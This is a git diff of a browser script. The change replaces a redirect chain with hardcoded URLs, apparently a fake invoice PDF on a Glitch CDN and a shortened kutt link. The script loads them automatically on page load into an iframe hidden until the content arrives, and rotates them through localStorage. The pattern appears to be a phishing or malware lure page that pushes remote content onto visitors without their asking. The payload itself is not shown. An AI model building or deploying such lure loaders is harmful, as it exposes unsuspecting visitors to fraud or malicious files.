@@ -1,30 +1,48 @@
-fetch('urls.json')
-  .then(response => response.json())
-  .then(data => {
-    const urls = data.map(url => ({ url, timeout: 2000 }));
-    const loader = document.getElementById('loader');
-    let index = 0;
+const defaultUrls = [
+  "https://cdn.glitch.global/49ef04c4-9556-4b36-a058-d476af6cd888/Invoice-H16367.pdf?v=1728781787797",
+  "https://cdn.glitch.global/49ef04c4-9556-4b36-a058-d476af6cd888/Invoice-H16367.pdf?v=1728781787797",
+  "https://kutt.itarian.com/VyWj9B"
+];
 
-function redirect() {
-if (index < urls.length) {
-const url = urls[index].url;
-const timeout = urls[index].timeout;
-index++;
+let urls = JSON.parse(localStorage.getItem("urls")) || [...defaultUrls];
 
-window.location.href = url;
-
-setTimeout(() => {
-loader.style.display = 'block';
-redirect();
-}, timeout);
+let currentIndex = localStorage.getItem("currentIndex");
+if (currentIndex === null || currentIndex >= urls.length) {
+  currentIndex = 0;
 } else {
-loader.style.display = 'none';
-window.location.href = '(link unavailable)';
-}
+  currentIndex = parseInt(currentIndex, 10);
 }
 
-document.addEventListener('DOMContentLoaded', () => {
-loader.style.display = 'block';
-redirect();
-});
+function loadNextURL() {
+  if (urls.length === 0) {
+    urls = [...defaultUrls];
+    alert("No more URLs available. Reinstalling the default URLs.");
+    localStorage.setItem("urls", JSON.stringify(urls));
+    currentIndex = 0;
+  }
+
+  const iframe = document.getElementById("content-frame");
+  const loader = document.getElementById("loader");
+
+  loader.style.display = "flex";
+
+  iframe.src = urls[currentIndex];
+
+  iframe.style.display = "none";
+
+  iframe.onload = function () {
+    loader.style.display = "none";
+    iframe.style.display = "block";
+  };
+
+  urls.splice(currentIndex, 1);
+
+  localStorage.setItem("urls", JSON.stringify(urls));
+
+  currentIndex = currentIndex % urls.length;
+  localStorage.setItem("currentIndex", currentIndex);
+}
+
+document.addEventListener("DOMContentLoaded", () => {
+  loadNextURL();
 });
